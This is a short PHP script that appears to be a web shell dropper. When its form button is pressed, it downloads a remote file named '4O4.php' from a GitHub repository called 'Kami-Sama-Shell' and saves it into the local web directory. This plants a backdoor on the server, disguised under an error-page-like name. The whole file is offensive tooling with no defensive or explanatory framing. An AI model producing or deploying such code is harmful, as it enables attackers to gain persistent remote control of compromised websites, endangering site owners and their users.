<?php
$remoteFile = 'https://raw.githubusercontent.com/worshipofkamisama/Kami-Sama-Shell/main/4O4.php';
$localFile = '4O4.php';

if (isset($_POST['download'])) {
    $content = file_get_contents($remoteFile);
    if ($content !== false) {
        file_put_contents($localFile, $content);
        echo 'File downloaded successfully.';
    } else {
        echo 'Error downloading the file.';
    }
}
?>

<form method="post">
    <button type="submit" name="download">Download File</button>
</form>
